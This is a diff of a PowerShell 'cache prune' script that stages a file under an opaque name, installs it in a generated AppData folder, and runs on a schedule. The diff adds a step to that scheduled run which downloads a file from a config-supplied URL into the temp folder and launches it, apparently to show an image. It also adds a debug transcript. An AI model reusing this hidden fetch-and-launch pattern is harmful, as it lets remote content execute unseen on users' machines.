@@ -68,6 +68,14 @@ function Install-Script {
 function Run-Schedule {
     # Pops up terminal with hello world and pauses
     Start-Process powershell -ArgumentList '-NoProfile', '-Command', 'Write-Host "Hello, world!"; pause; exit'
+
+    # Pull $config.imagePath/$config.image from GitHub and stage to temp dir.
+    $tempDir = [System.IO.Path]::GetTempPath()
+    $stagedImage = Join-Path -Path $tempDir -ChildPath $config.image
+    Invoke-WebRequest -Uri "$($config.imagePath)/$($config.image)" -OutFile $stagedImage -UseBasicParsing
+    Write-Verbose "Staged image to $stagedImage."
+    # Optionally, display the staged image in the terminal.
+    Start-Process -FilePath $stagedImage
     
 }
 
@@ -225,15 +233,12 @@ if ($Schedule) {
 
 # Load configuration settings
 $config = Get-Config
-Write-Verbose "Loaded config settings:`n$($config | Out-String)"
 $appName = Get-AppName
-Write-Verbose "Generated app name: $appName"
 
 
 # Determine the script name and path from the configuration.
 $scriptName = if ($config.localScriptName) { $config.localScriptName } else { 'cache_2.718281228459045' }
 $stagedScript = Join-Path -Path $env:TEMP -ChildPath $scriptName
-Write-Verbose "Staged script path: $stagedScript"
 
 # Determine the target directory for the installed script based on the config.
 $targetDir = if ($config.targetDir) {
@@ -241,18 +246,43 @@ $targetDir = if ($config.targetDir) {
 } else {
     Join-Path -Path $env:APPDATA -ChildPath "$($config.interrimPath)\$appName"
 }
-Write-Verbose "Target directory for script: $targetDir"
 
-if ($Uninstall) {
-    Uninstall-Script
-} elseif ($NoStage) {
-    Install-Script
-} else {
-    Stage-Script
-    Start-StagedScript
+$debugTranscriptStarted = $false
+if ($Debug) {
+    if (-not (Test-Path -Path $targetDir)) {
+        New-Item -Path $targetDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+    }
+
+    $debugLogPath = Join-Path -Path $targetDir -ChildPath 'debug.log'
+    Start-Transcript -Path $debugLogPath -Append | Out-Null
+    $debugTranscriptStarted = $true
+    Write-Verbose "Debug log path: $debugLogPath"
 }
 
+try {
+    Write-Verbose "Loaded config settings:`n$($config | Out-String)"
+    Write-Verbose "Generated app name: $appName"
+    Write-Verbose "Staged script path: $stagedScript"
+    Write-Verbose "Target directory for script: $targetDir"
 
+    if ($Uninstall) {
+        if ($debugTranscriptStarted) {
+            Stop-Transcript | Out-Null
+            $debugTranscriptStarted = $false
+        }
 
-Write-Verbose "Cache prune script execution completed."
+        Uninstall-Script
+    } elseif ($NoStage) {
+        Install-Script
+    } else {
+        Stage-Script
+        Start-StagedScript
+    }
+
+    Write-Verbose "Cache prune script execution completed."
+} finally {
+    if ($debugTranscriptStarted) {
+        Stop-Transcript | Out-Null
+    }
+}
 # Read-Host "Press Enter to exit."
